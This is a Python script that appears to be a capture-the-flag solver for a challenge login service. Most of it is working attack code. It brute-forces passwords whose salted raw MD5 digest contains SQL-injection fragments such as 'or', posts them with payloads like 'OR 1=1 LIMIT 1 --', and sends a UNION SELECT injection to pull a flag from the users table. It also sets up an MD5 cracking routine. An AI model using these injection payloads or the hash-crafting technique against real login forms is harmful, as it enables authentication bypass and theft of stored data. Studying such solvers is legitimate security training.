#!/usr/bin/env python

from chdrft.cmds import CmdsList
from chdrft.main import app
from chdrft.utils.cmdify import ActionHandler
from chdrft.utils.misc import Attributize
import chdrft.utils.misc as cmisc
import glog
import hashlib
import requests

global flags, cache
flags = None
cache = None


def args(parser):
  clist = CmdsList().add(test).add(test2).add(test3).add(test4)
  ActionHandler.Prepare(parser, clist.lst)


def test2(ctx):
  salt=8620371
  lst = [2729528, 44540839, 47214830, 4503357828, 4555887976, 4564118987]
  lst.extend((34377638006 , 34403208701 , 34619378927 , 34631002550 , 34694061860 , 34728312208 , 34744920263 , 34756818346 , 34941238518, 34962113958 , 35020468971 , 35063588965 ))

  lst = [68953056958]


  #for i in lst:
  for i in range(2**36, 2**64):
    sx = f'aa{i}'

    u =  hashlib.md5(f'{salt}{sx}'.encode()).digest()


    for cnd in (b"'or'",b"'Or'",b"'oR'",b"'OR'",b"'=0'", b"'=0;", b"'or"):
      if cnd in u:
        print('try ', i, u)
        users = ('user', 'admin', 'iansus', 'username', 'login', 'root', '--', 'OR 1=1 LIMIT 1 -- ', 'LIMIT 1 --', 'LIMIT 1 ;')
        for user in users:
          res = requests.post('http://finale-docker.rtfm.re:4444', data={'login': user, 'password': sx})
          if res.text.find('Wrong username') == -1:
            print('FOUDN FOR ', sx, user)
            print(res.text)



def test4(ctx):
  from chdrft.utils.swig import swig
  c = swig.opa_crypto_swig

  a = c.MultiplePatternChecker_getCl()
  ap = c.MultiplePatternCheckerParams()
  tb = c.PatternCheckerParamsVector()
  for cnd in (b"'or'",b"'Or'",b"'oR'",b"'OR'",b"'=0'", b"'=0;", b"'or"):
    x = c.PatternCheckerParams()
    x.from_string(-1, cnd)
    tb.append(x)
  ap.set_cx(tb)
  a.set_params(ap)

  b = c.Md5_getCl()
  mc = c.MapperAndChecker_getCl()
  mcp = c.MapperAndCheckerParams()
  mcp.mapper = b
  mcp.checker = a
  mc.set_params(mcp)

  cracker = c.Cracker()
  crackerp = c.CrackerParams()

  pattern = c.Pattern()

  salt=8620371
  rem = 'a'*8
  base= str(salt)
  pattern.init = base + rem
  pattern.charset = 'abcdefghijk'
  pattern.mp = c.vi([i for i in range(len(base), len(pattern.init))])

  tmp = c.PatternVector()
  tmp.push_back(pattern)
  crackerp.patterns = tmp
  crackerp.checker = mc
  crackerp.n_res = 10
  cracker.init(crackerp)

  runner = swig.opa_threading_swig.Runner()
  runner.run_cmd()
  dispatcher = runner.dispatcher()
  dispatcher.process_job(cracker.get_job())

  res = cracker.res().tb
  for v in res:
    print('Result >> ', v)
    import hashlib
    print(hashlib.md5(v.encode()).digest())



def test(ctx):
  print('on test')
  want = '4322dfb1e9b20645594e9f3f6998845a'
  print(hashlib.md5('1231123'.encode()).hexdigest())
  for i in range(int(1e7)):
    s = '%d'%i + '1'
    have = hashlib.md5(s.encode()).hexdigest()
    if have == want:
      print('OK ', i)


def test3(ctx):
  req = 'and 0 union select flag_field as login from users where id > 2 limit 1 --'
  res = requests.post('http://finale-docker.rtfm.re:4444', data={'login': req, 'password': 'aa68770510512'})
  print(res.text)
def main():
  ctx = Attributize()
  ActionHandler.Run(ctx)


app()
